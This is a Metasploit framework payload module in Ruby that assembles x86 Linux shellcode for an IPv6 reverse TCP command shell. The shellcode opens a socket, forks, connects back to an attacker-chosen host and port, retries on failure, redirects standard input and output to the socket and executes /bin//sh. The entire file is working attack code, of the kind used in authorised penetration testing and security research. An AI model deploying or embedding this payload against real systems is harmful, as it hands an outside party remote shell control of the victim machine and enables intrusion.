##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 168

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline (IPv6)',
      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
      'Author'        => 'Matteo Malvica <matteo[at]malvica.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix
    ))
  end

  def generate_stage
      temp =  [datastore['LPORT'].to_i].pack('S>') 
      tcp_port = temp.unpack('H*')
      
    payload_data =<<-EOS
        xor  ebx,ebx
        mul  ebx
        push 0x6
        push 0x1
        push 0xa
        mov  ecx,esp
        mov  al,0x66
        mov  bl,0x1
        int  0x80
        mov  esi,eax
        xor  eax,eax
        mov  al,0x2
        xor  ebx,ebx
        int  0x80
        cmp eax,ebx
        je connect
        ja exit

      connect:
        xor  ecx,ecx
        xor  ebx,ebx
        push ebx
        push ebx

        push ebx
        push ebx
        push ebx
        push ebx

        push ebx
        push.i16  0x#{tcp_port}
        push.i16 0xa
        mov ecx, esp
        push.i8 0x1c
        push ecx
        push esi
        xor ebx,ebx
        xor eax,eax
        mov al,0x66
        mov bl,0x3
        mov ecx,esp
        int 0x80

        xor ebx,ebx
        cmp eax,ebx
        jne retry

        xor ecx,ecx
        mul ecx
        mov ebx,esi
        mov al,0x3f
        int 0x80

        xor eax,eax
        inc ecx
        mov ebx,esi
        mov al,0x3f
        int 0x80

        xor eax,eax
        inc ecx
        mov ebx,esi
        mov al,0x3f
        int 0x80

        xor edx,edx
        mul edx
        push edx
        push 0x68732f2f
        push 0x6e69622f
        mov ebx,esp
        push edx
        push ebx
        mov ecx,esp
        mov al,0xb
        int 0x80
        ret

      retry:
        xor ebx,ebx
        push ebx
        push.i8 0xa
        mul ebx
        mov ebx,esp
        mov al,0xa2
        int 0x80
        jmp connect
        ret

      exit:
        xor eax,eax
        mov al,0x1
        int 0x80
    EOS

    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
  end
end
